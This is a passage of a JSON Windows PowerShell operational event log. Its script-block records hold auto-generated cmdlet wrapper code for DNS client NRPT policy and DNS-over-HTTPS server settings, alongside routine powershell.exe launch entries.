$script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableDAForAllNetworks')) {\r\n          [object]$__cmdletization_value = ${EnableDAForAllNetworks}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDAForAllNetworks'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDAForAllNetworks'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SecureNameQueryFallback')) {\r\n          [object]$__cmdletization_value = ${SecureNameQueryFallback}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SecureNameQueryFallback'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SecureNameQueryFallback'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QueryPolicy')) {\r\n          [object]$__cmdletization_value = ${QueryPolicy}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QueryPolicy'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QueryPolicy'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PassThru')) {\r\n          [object]$__cmdletization_value = ${PassThru}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptGlobal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTGlobal_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClientNrptGlobal' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root/Microsoft/Windows/DNS/PS_DnsClientNrptPolicy'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-DnsClientNrptPolicy\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientPolicyConfiguration')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Get0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Effective},\r\n\r\n    [Parameter(ParameterSetName='Get0', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Namespace},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Effective')) {\r\n          [object]$__cmdletization_value = ${Effective}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Effective'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Effective'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Namespace')) {\r\n          [object]$__cmdletization_value = ${Namespace}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientPolicyConfiguration'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Get', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNrptPolicy_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientNrptPolicy' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ServerAddress') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ServerAddress})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ServerAddress', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientDohServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-DnsClientDohServerAddress' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "}\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientDohServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientDohServerAddress' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClientDohServerAddress\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientDohServerAddress')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Query (cdxml)', Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${ServerAddress},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_DNSClientDohServerAddress')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${DohTemplate},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)', Position=2, ValueFromPipelineByPropertyName=$true)]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Position=2, ValueFromPipelineByPropertyName=$true)]\r\n    [bool]\r\n    ${AllowFallbackToUdp},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)', Position=3, ValueFromPipelineByPropertyName=$true)]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Position=3, ValueFromPipelineByPropertyName=$true)]\r\n    [bool]\r\n    ${AutoUpgrade},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ServerAddress') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ServerAddress})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ServerAddress', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('DohTemplate')) {\r\n            [object]$__cmdletization_value = ${DohTemplate}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DohTemplate'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DohTemplate'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('AllowFallbackToUdp')) {\r\n            [object]$__cmdletization_value = ${AllowFallbackToUdp}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowFallbackToUdp'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowFallbackToUdp'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('AutoUpgrade')) {\r\n            [object]$__cmdletization_value = ${AutoUpgrade}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoUpgrade'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoUpgrade'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientDohServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClientDohServerAddress' -Alias '*'\r\n        \r\n\r\nfunction Remove-DnsClientDohServerAddress\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientDohServerAddress')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Query (cdxml)', Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${ServerAddress},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_DNSClientDohServerAddress')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    